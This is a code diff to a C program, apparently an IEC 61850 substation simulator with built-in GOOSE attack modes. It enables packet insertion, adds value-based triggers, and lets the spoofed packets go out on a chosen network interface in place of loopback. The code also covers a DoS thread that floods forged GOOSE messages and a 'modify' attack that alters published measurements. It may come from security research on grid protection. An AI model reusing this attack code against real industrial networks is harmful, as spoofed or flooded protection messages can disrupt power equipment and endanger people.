@@ -21,15 +21,15 @@
 extern IedModel iedModel;
 static IedServer iedServer = NULL;
 
-bool enableInsertAttack=false;
+bool enableInsertAttack=true;
 bool enableModifyAttack=false;
-bool enableDosAttack=true ;
+bool enableDosAttack=false ;
 int executedInsertAttackCount=0;
 int executedModifyAttackCount=0;
 int executedDosAttackCount=0;
 struct AttackList attackList;
 clock_t beginTime;
-
+bool firstPublishGoose=true;
 // has to be executed as root!
 int main(int argc, char **argv) {
 	char *interface;
@@ -93,11 +93,11 @@ int main(int argc, char **argv) {
 	 strcat (relatedCSVFileName,CSVFILENAME);
 	 FILE *stream = fopen(relatedCSVFileName, "r");*/
 	FILE *stream = fopen(CSVFILENAME, "r");
+	char cwd[100];
+	if (getcwd(cwd, sizeof(cwd)) != NULL) {
+		printf("Current working dir: %s\n", cwd);
+	}
 	if (stream == NULL) {
-		char cwd[100];
-		if (getcwd(cwd, sizeof(cwd)) != NULL) {
-			printf("Current working dir: %s\n", cwd);
-		}
 		printf("Cannot load csv file.\n");
 		exit(-1);
 	}
@@ -115,39 +115,35 @@ int main(int argc, char **argv) {
 
 	//update packets value basing on csv file.
 	int running = 1;
+	char **lastResult;
+	char * lastBuffer;
+	lastBuffer=(char*) malloc(bufsize * sizeof(char));
 	while (running) {
 		lineSize = getline(&buffer, &bufsize, stream);
 		if (lineSize != -1) { //read a new line from csv
 			char *tmp = strdup(buffer);
 			char **results = getfield(tmp);
-			while (1) {
-				if (getTime() > nextUpdatePayloadTime) {
-					nextUpdatePayloadTime = nextUpdatePayloadTime + 1;
-					break;
+			if(firstPublishGoose){//if this is the first time loop , no need to update St Sq number.
+				firstPublishGoose=false;
+				//strcpy(historyBuff,buffer);
+				memcpy(lastBuffer, buffer, sizeof(char)*lineSize);
+			}else{// manually update: stnum++, sqnum=0, if value changed, updateStNum. otherwise, sq++ st keeps the same value.
+				if(strcmp(buffer,lastBuffer)){ //if current and history buff is different, update st++
+					updateStNum(iedServer);
+					//printf("update st\n");
+				}else{
+					//printf("not update st!\n");
 				}
+				memcpy(lastBuffer, buffer, lineSize);
 			}
-			//manually update: stnum++, sqnum=0
-			updateStNum(iedServer);
 
-			// launch insert attack
-			if (enableInsertAttack) {
-				launchInsertAttack(iedServer);
-			}
 
 			//launch modify attack
 			if(enableModifyAttack){
 				launchModifyAttack(iedServer,results);
 			}
 
-			//launch DoS attack
-			if(enableDosAttack){
 
-				launchDoSAttack(iedServer);
-				//pthread_create(&tid_1, NULL, launchDoSAttackTEMP, (void *)10); //10 is the number of packets
-			    //pthread_join(tid_1, NULL);
-			    //printf("DoS attack completed! \n");
-			    //enableDoSAttack = false;
-			}
 
 
 			IedServer_lockDataModel(iedServer); //Lock the MMS server data model.Client requests will be postponed until the lock is removed.
@@ -194,6 +190,22 @@ int main(int argc, char **argv) {
 			IEDMODEL_MEAS_MMXU_TotPF_instMag_f, atof(results[19]));
 			//End of insert code
 			IedServer_unlockDataModel(iedServer);
+			while (1) {
+					if (getTime() > nextUpdatePayloadTime) {
+						nextUpdatePayloadTime = nextUpdatePayloadTime + 1;
+						break;
+					}
+			}
+
+			if (enableInsertAttack) {
+				launchInsertAttack(iedServer,results);
+			}
+			//launch DoS attack
+			if(enableDosAttack){
+			}
+
+			//manually update: stnum++, sqnum=0
+			//updateStNum(iedServer);//todo: check if value changed, updateStNum. if not, sq++ st keeps the same value.
 
 			free(tmp);
 			free(results);
@@ -253,7 +265,7 @@ void updateStNum(IedServer iedserver) {
 		GoosePublisher_increaseStNum(publisher);
 	}
 }
-void launchInsertAttack(IedServer iedserver) {
+void launchInsertAttack(IedServer iedserver,char **results) {
 	LinkedList element = iedserver->mmsMapping->gseControls;
 	while ((element = LinkedList_getNext(element)) != NULL) {
 		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
@@ -264,8 +276,11 @@ void launchInsertAttack(IedServer iedserver) {
 			currentAttack = attackList.insertAttackList[index];
 			if (!currentAttack.executed) {
 				if (currentAttack.condition_type == CONDITION_ST_SQ_GCB) {
+					//printf("stnum is %d:%d\n",GoosePublisher_getStNum(publisher),currentAttack.condition_st);
+					//printf("sqnum is %d:%d\n",GoosePublisher_getSqNum(publisher),currentAttack.condition_sq);
+					//printf("name is %s:%s\n",gcb->name,currentAttack.condition_gcb);
 					if (GoosePublisher_getStNum(publisher)== currentAttack.condition_st
-							&& GoosePublisher_getSqNum(publisher)== currentAttack.condition_sq
+							&& (GoosePublisher_getSqNum(publisher)-1)== currentAttack.condition_sq
 							&& !strcmp(gcb->name, currentAttack.condition_gcb)) {
 						insertPacket(currentAttack);
 						currentAttack.executed = true;
@@ -278,6 +293,13 @@ void launchInsertAttack(IedServer iedserver) {
 						currentAttack.executed = true;
 						executedInsertAttackCount++;
 						//break;
+					}
+				}else if(currentAttack.condition_type == CONDITION_PAYLOAD){
+					if((!strcmp(gcb->name, currentAttack.condition_gcb))&&payloadConditionTrigger(currentAttack.condition_payloads,results)){
+						printf("trigger insert attack by condition_payload\n");
+						insertPacket(currentAttack);
+						currentAttack.executed = true;
+						executedInsertAttackCount++;
 					}
 				}
 			}
@@ -295,7 +317,7 @@ void launchInsertAttack(IedServer iedserver) {
 void insertPacket(struct InsertAttack iAttack) {
 
 	printf("insert a packet\n");
-	char *interface = "lo";
+	//char *interface = "lo";
 
 	LinkedList dataSetValues = LinkedList_create();
 	int valueIndex=0;
@@ -310,7 +332,7 @@ void insertPacket(struct InsertAttack iAttack) {
 			if(!strcmp(currentValue.value,"true")){
 				binValue=true;
 			}
-			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));//todo double check why use binary time???
+			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));
 
 		}else if(!strcmp(currentValue.type,"float")){
 			LinkedList_add(dataSetValues,MmsValue_newFloat(atof(currentValue.value)));
@@ -339,8 +361,7 @@ void insertPacket(struct InsertAttack iAttack) {
 	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
 	 * stack_config.h is used.
 	 */
-	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,
-			interface);
+	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,iAttack.interface);
 	//set st & sq number.
 	//publisher->stNum=iAttack.stNum;
 	//publisher->sqNum=iAttack.sqNum;
@@ -371,7 +392,7 @@ void launchDoSAttack(IedServer iedserver) {//todo rewrite
 			if (!currentAttack.executed) {
 				if (currentAttack.condition_type == CONDITION_ST_SQ_GCB) {
 					if (GoosePublisher_getStNum(publisher)== currentAttack.condition_st
-							&& GoosePublisher_getSqNum(publisher)== currentAttack.condition_sq
+							&& GoosePublisher_getSqNum(publisher)-1== currentAttack.condition_sq
 							&& !strcmp(gcb->name, currentAttack.condition_gcb)) {
 						createDoSAttackThread(currentAttack);
 						currentAttack.executed = true;
@@ -404,8 +425,6 @@ void createDoSAttackThread(struct DosAttack dAttack){
 void* sendDosAttackPacket(void *dAttack) {
 	struct DosAttack *attackPointer = (struct DosAttack*) dAttack;
 	struct DosAttack attack=*attackPointer;
-	char *interface = "lo";
-
 	LinkedList dataSetValues = LinkedList_create();
 	int valueIndex = 0;
 	while (strlen(attack.values[valueIndex].value) != 0) {
@@ -421,7 +440,7 @@ void* sendDosAttackPacket(void *dAttack) {
 			if (!strcmp(currentValue.value, "true")) {
 				binValue = true;
 			}
-			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));//todo double check why use binary time???
+			LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));
 
 		} else if (!strcmp(currentValue.type, "float")) {
 			LinkedList_add(dataSetValues,
@@ -448,8 +467,7 @@ void* sendDosAttackPacket(void *dAttack) {
 	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
 	 * stack_config.h is used.
 	 */
-	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,
-			interface);
+	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,attack.interface);
 	//set st & sq number.
 	//publisher->stNum=iAttack.stNum;
 	//publisher->sqNum=iAttack.sqNum;
@@ -476,43 +494,7 @@ void* sendDosAttackPacket(void *dAttack) {
 	pthread_exit(0);
 }
 
-/*void insertDoSPacket(int num_of_packets, LinkedList* dataSetValues, GoosePublisher* publisher) {
 
-	printf("inserting a DoS packet\n");
-	char *interface = "lo";
-	int cnt;
-
-	LinkedList_add(*dataSetValues, MmsValue_newIntegerFromInt32(1234));
-	LinkedList_add(*dataSetValues, MmsValue_newBinaryTime(false));
-	LinkedList_add(*dataSetValues, MmsValue_newIntegerFromInt32(5678));
-
-	CommParameters gooseCommParameters;
-
-	gooseCommParameters.appId = 1000;
-	gooseCommParameters.dstAddress[0] = 0x01;
-	gooseCommParameters.dstAddress[1] = 0x0c;
-	gooseCommParameters.dstAddress[2] = 0xcd;
-	gooseCommParameters.dstAddress[3] = 0x01;
-	gooseCommParameters.dstAddress[4] = 0x00;
-	gooseCommParameters.dstAddress[5] = 0x01;
-	gooseCommParameters.vlanId = 0;
-	gooseCommParameters.vlanPriority = 4;
-
-	*publisher = GoosePublisher_create(&gooseCommParameters,
-			interface);
-
-	GoosePublisher_setGoCbRef(*publisher, "liyuanTest/LLN0$GO$gcbAnalogValues");
-	GoosePublisher_setConfRev(*publisher, 1);
-	GoosePublisher_setDataSetRef(*publisher, "liyuanTest/LLN0$AnalogValues");
-	// Send number of packets
-	while(num_of_packets > 1 ) {
-		if (GoosePublisher_publish(*publisher, *dataSetValues) == -1) {
-				printf("Error sending message!\n");
-			}
-		num_of_packets = num_of_packets-1;
-	  }
-
-}*/
 void launchModifyAttack(IedServer iedserver,char** array){
 	LinkedList element = iedserver->mmsMapping->gseControls;
 	while ((element = LinkedList_getNext(element)) != NULL) {
@@ -558,11 +540,28 @@ void launchModifyAttack(IedServer iedserver,char** array){
 void ModifyArray(char** array,struct ModifyAttack mAttack){
 	int i=0;
 	//while(!strcmp(mAttack.modifications[i].modifiedvalue,"")){
-	while(strlen(mAttack.modifications[i].modifiedvalue)!=0){
-		struct ModifyAttackModification modification=mAttack.modifications[i++];
-		array[modification.arrayIndex-1]=modification.modifiedvalue;
+	while(mAttack.modifications[i].arrayIndex>0){
+		(array[mAttack.modifications[i].arrayIndex-1])=(mAttack.modifications[i].modifiedvalue);
+		//printf("current %d:%s\n",i,array[i]);
+		i++;
+	}
+	int j=0;
+	while(j<10){
+
+		printf("array %d:%s\n",j,array[j]);
+		j++;
 	}
 
+	/*printf("array %d:%s\n",0,array[0]);
+	printf("array %d:%s\n",1,array[1]);
+	printf("array %d:%s\n",2,array[2]);
+	printf("array %d:%s\n",3,array[3]);
+	printf("array %d:%s\n",4,array[4]);
+	printf("array %d:%s\n",5,array[5]);
+	printf("array %d:%s\n",6,array[6]);
+	printf("array %d:%s\n",7,array[7]);
+	printf("array %d:%s\n",8,array[8]);
+	printf("array %d:%s\n",9,array[9]);*/
 }
 double getRuningTime(){
 	clock_t currentTime = clock();
@@ -576,4 +575,48 @@ int getHexFromString(int index,char * string){
 	int number = (int)strtol(substr, NULL, 16);
 	free(substr);
 	return number;
+}
+bool payloadConditionTrigger(struct PayloadCondition condition_payloads[MAXIMUM_CONDITION_PAYLOAD_SIZE],char **results){
+	int i=0;
+	bool returnValue=true;
+	while(condition_payloads[i].index>0){
+		struct PayloadCondition current_payload=condition_payloads[i];
+		if(!strcmp(current_payload.type,"string")){
+			if(strcmp(results[current_payload.index-1],current_payload.value)){
+				returnValue=false;
+				break;
+			}
+		}else if(!strcmp(current_payload.type,"numeric")){
+			float pValue=atof(current_payload.value);
+			float rValue=atof(results[current_payload.index-1]);
+			if(!strcmp(current_payload.operator,"bigger")){
+				if(!(rValue>pValue)){
+					returnValue=false;
+					break;
+				}
+			}else if(!strcmp(current_payload.operator,"smaller")){
+
+				if(!(rValue<pValue)){
+					returnValue=false;
+					break;
+				}
+			}else if(!strcmp(current_payload.operator,"equal")){
+				if(!(rValue==pValue)){
+					returnValue=false;
+					break;
+				}
+			}
+		}else if(!strcmp(current_payload.type,"boolean")){
+			bool pValue=stobool(current_payload.value);
+			bool rValue=stobool(results[current_payload.index-1]);
+			if(!(pValue==rValue)){
+				returnValue=false;
+				break;
+			}
+		}
+		//results[condition_payloads[i].index];
+		i++;
+	}
+	return returnValue;
+
 }
